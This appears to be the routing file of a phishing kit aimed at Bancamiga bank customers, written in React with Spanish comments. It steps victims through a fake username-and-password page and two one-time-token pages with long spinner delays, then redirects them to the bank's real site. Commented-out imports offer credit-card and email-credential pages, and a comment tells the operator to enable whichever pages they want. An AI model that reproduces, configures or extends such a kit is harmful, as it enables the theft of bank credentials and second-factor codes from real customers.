import React from 'react'
import { BrowserRouter, Route, Routes } from 'react-router-dom'
// import { CreditCard } from '../pages/card/CreditCard'
// import { EmailAndPassword } from '../pages/email/emailAndPassword/EmailAndPassword'
// import { EmailAndPhone } from '../pages/email/emailAndPhone/EmailAndPhone'
import { Token } from '../pages/token/Token'
import { UsernameAndPassword } from '../pages/usernamepassword/UsernameAndPassword'

export const Navigation = () => {
  return (
    <BrowserRouter>
        <Routes>
            {/* AQUI SOLO HAY QUE DESCOMENTAR LOS QUE DESEAS USAR EN EL ORDEN QUE DESEES QUE ESTÉ */}
            
            <Route path='/' element={<UsernameAndPassword
              timeLoader={3000}
              spiner={true}
              urlToNavigate={'token'}
            />} />

            {/* token/Token */}
            <Route path='/token' element={
              <Token tokenMode={'token1'} spiner={true} timeLoader={30000} urlToNavigate={'token2'} />} 
            />
            <Route path='/token2' element={
              <Token tokenMode={'token2'} spiner={true} timeLoader={30000} endUrl='https://online.bancamiga.com/?p=1' />} 
            />
        </Routes>
    </BrowserRouter>
  )
}
